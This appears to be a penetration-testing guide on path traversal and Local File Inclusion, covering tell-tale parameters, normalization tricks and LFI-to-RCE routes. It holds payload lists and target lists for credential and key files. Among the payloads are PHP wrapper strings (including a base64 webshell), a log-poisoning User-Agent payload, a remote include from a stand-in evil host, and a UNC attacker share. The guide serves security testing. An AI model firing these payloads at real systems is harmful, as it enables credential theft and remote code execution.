# Path Traversal and Local File Inclusion

Path traversal reads (or writes) files outside the intended directory by walking the filesystem with `../`. Local File Inclusion is its dangerous cousin where the file you reach is then included and executed. The modern findings are in encoding tricks, normalization gaps, wrapper abuse, and turning file read into code execution.

## The mental model

The server builds a filesystem path from user input and does not confine it to the intended base directory. You supply `../` sequences (or encodings of them) to climb out and reach arbitrary files. If the reached file is merely read, you leak secrets; if it is `include`d or `require`d (PHP) or used as a template/module, you may execute it, which is LFI to RCE.

## Where it hides / tell-tales

- **Any filename or path parameter**: `?file=`, `?page=`, `?template=`, `?lang=`, `?download=`, `?doc=`, `?path=`, `?image=`, avatar and attachment fetchers, PDF/report generators, language/theme selectors, and log viewers.
- **Download and export endpoints**: `GET /download?f=report.pdf` where `f` is used to open a file.
- **Archive extraction and upload filename**: see `File-Upload.md` for Zip Slip and filename traversal on the write side.
- **Indirect path building**: the app concatenates a base dir, your input, and an extension (`"/var/data/" + input + ".txt"`). You need to defeat the appended extension (null byte on old stacks, path truncation, or a wrapper).
- **Reflected file content or distinct errors**: the response contains file content, or returns different errors for existing vs non-existing paths, giving a read/enumeration oracle even when content is not shown.

## Real material

Baseline and encoding variants (defeat naive `../` filters):

```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd            (URL-encoded slash)
..%252f..%252f                          (double URL-encoded)
....//....//                            (filter strips one "../", leaving "../")
..%c0%af..%c0%af                        (overlong UTF-8, old servers)
%2e%2e%2f                               (encoded dots and slash)
..\..\..\windows\win.ini               (Windows backslash)
/var/www/../../etc/passwd              (absolute + traversal)
```

Defeating an appended extension:

```
input=../../etc/passwd%00            (null byte truncates ".txt", old PHP)
input=../../etc/passwd                (if the code does not append, or you can traverse past)
```

High-value files to read (Linux):

```
/etc/passwd                 (users)
/proc/self/environ          (env vars, sometimes secrets; also an LFI-to-RCE vector)
/proc/self/cmdline
/var/www/html/config.php     (app DB creds)
~/.aws/credentials  ~/.ssh/id_rsa  /root/.bash_history
/var/log/apache2/access.log  (log poisoning target)
.env  .git/config  docker-compose.yml  application.properties
```

PHP wrappers (LFI power tools):

```
php://filter/convert.base64-encode/resource=config.php   (read source without executing it)
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   (data:// RCE if allow_url_include)
expect://id                                               (expect wrapper RCE)
php://input                                               (POST body as code, with include)
zip://uploaded.zip%23shell.php                            (reach a file inside an uploaded archive)
```

## Beyond the basics

- **Normalization discrepancy is the core skill**: the filter, the language's path API, and the OS each normalize differently. `....//`, mixed encodings, and trailing dots/slashes exploit the gap between what the validator sees and what `open()` resolves. This is the same discrepancy family as `Broken-Access-Control.md` and smuggling; carry it here.
- **LFI to RCE paths**: (1) `php://filter` to read source and find more bugs or secrets; (2) log poisoning: inject PHP into a log the server writes (`User-Agent: <?php system($_GET['c']); ?>`) then include `/var/log/.../access.log`; (3) `/proc/self/environ` poisoning via `User-Agent`; (4) session-file inclusion: write PHP into your session data, then include `/var/lib/php/sessions/sess_<id>`; (5) `data://`/`expect://`/`php://input` wrappers when `allow_url_include` is on; (6) PHP filter-chain RCE, which crafts a chain of `php://filter` conversions that synthesizes arbitrary PHP from an error-controlled stream, achieving RCE with nothing but a file-read primitive.
- **Remote File Inclusion**: if `allow_url_include`/`allow_url_fopen` is on and the include takes a URL, `?page=http://evil.tld/shell.txt` runs your remote code. Rare now, but check.
- **Read-to-secret-to-pivot**: a bare file read is a medium; reading `.aws/credentials`, `.ssh/id_rsa`, a DB config, or a signing key turns it into cloud/account compromise. Always go for the credential file, not just `/etc/passwd`.
- **Windows specifics**: backslashes, `C:\Windows\win.ini`, UNC paths (`\\attacker\share` for SSRF/NTLM leak), and 8.3 short names.
- **Traversal on the write side**: if input controls a write path (upload, log path, export destination), traversal writes a webshell or overwrites config, which is direct RCE. More dangerous than read.

## What to watch for

- A `200` echoing your input is not traversal; confirm actual out-of-base file content (e.g. the recognizable `root:x:0:0` of `/etc/passwd`).
- Null-byte truncation is fixed in modern PHP; do not rely on it against current stacks, use wrappers and filter chains instead.
- Container filesystems lack the usual targets; read `/proc/self/environ`, app config, and mounted secrets instead of classic paths.
- Do not plant persistent webshells or overwrite real config on live systems; prove minimally.

## Hunting checklist

- Test every file/path parameter with the encoding-variant set, both read and (if applicable) write.
- Confirm with recognizable file content, not just a different response.
- If PHP, try `php://filter` base64 to read source, then filter-chain RCE.
- Attempt LFI-to-RCE via log/environ/session poisoning where a read primitive exists.
- Prioritize credential and key files over `/etc/passwd`.
- On Windows, test backslashes and UNC paths; consider NTLM leak via UNC.
